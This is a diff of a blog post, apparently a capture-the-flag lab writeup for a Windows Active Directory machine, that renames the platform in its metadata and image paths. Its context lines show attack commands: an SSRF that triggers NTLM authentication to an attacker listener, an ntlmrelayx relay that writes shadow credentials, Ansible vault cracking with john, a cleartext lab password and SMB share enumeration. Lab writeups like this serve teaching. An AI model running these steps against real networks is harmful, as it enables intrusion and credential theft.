@@ -1,10 +1,10 @@
 ---
 layout: post
-title: "TicketTak (Easy) — HTB"
+title: "TicketTak (Easy) — Kenolab"
 date: 2026-11-07 00:00:00 +0100
 categories:
   - Writeups
-  - HTB
+  - Kenolab
 tags:
   - easy
   - Windows
@@ -15,7 +15,7 @@ tags:
   - silver-ticket
   - golden-ticket
   - ansible-vault
-image: assets/img/Writeup/HTB/TicketTak/tickettak.png
+image: assets/img/Writeup/Kenolab/TicketTak/tickettak.png
 published: true
 description: Easy Windows AD Machine Writeup by Uzurly
 ---
@@ -72,7 +72,7 @@ Then trigger the SSRF, WEB01 authenticates over NTLM to our listener:
 curl -s -X POST 'http://10.253.45.29/' --data 'url=http://pdf.kenocorp.lan'
 ```
 
-![SSRF NTLM capture](/assets/img/Writeup/HTB/TicketTak/ssrf-capture.png)
+![SSRF NTLM capture](/assets/img/Writeup/Kenolab/TicketTak/ssrf-capture.png)
 
 ### ntlmrelayx → Shadow Credentials
 
@@ -82,7 +82,7 @@ ntlmrelayx.py -t ldap://10.253.45.11 --shadow-credentials --shadow-target 'WEB01
 
 WEB01$'s NTLM auth gets relayed to LDAP on DC01 → `msDS-KeyCredentialLink` written on WEB01$.
 
-![Shadow credentials success](/assets/img/Writeup/HTB/TicketTak/shadow-creds.png)
+![Shadow credentials success](/assets/img/Writeup/Kenolab/TicketTak/shadow-creds.png)
 
 Output: `78HEvZju.pfx` / `VDRzSs8yBjUcewvtH`
 
@@ -123,7 +123,7 @@ KENO{Silv3r_N0t_Sl1ver}
 
 secretsdump on WEB01 returns DCC2 hashes and a DefaultPassword. In `C:\OPS\ansible\00_inventory.yml` there is an Ansible vault containing pierre.durand's password.
 
-![Ansible vault found](/assets/img/Writeup/HTB/TicketTak/ansible-vault.png)
+![Ansible vault found](/assets/img/Writeup/Kenolab/TicketTak/ansible-vault.png)
 
 ```bash
 ansible2john.py /tmp/vault.yml > /tmp/vault.hash && john /tmp/vault.hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -143,13 +143,13 @@ Credential: `pierre.durand:wp7DIjcIg9ib0JMLLbOI85qCD#`
 
 `pierre.durand` is in **Security** → member of **IT** → access to the IT share on DC01.
 
-![pierre.durand BloodHound groups](/assets/img/Writeup/HTB/TicketTak/bh-groups.png)
+![pierre.durand BloodHound groups](/assets/img/Writeup/Kenolab/TicketTak/bh-groups.png)
 
 ```bash
 nxc smb 10.253.45.11 -u pierre.durand -p 'wp7DIjcIg9ib0JMLLbOI85qCD#' --shares
 ```
 
-![IT share PDF download](/assets/img/Writeup/HTB/TicketTak/it-share.png)
+![IT share PDF download](/assets/img/Writeup/Kenolab/TicketTak/it-share.png)
 
 ```
 \\10.253.45.11\IT\Security\pentest_report.pdf  ← 1.2 MB
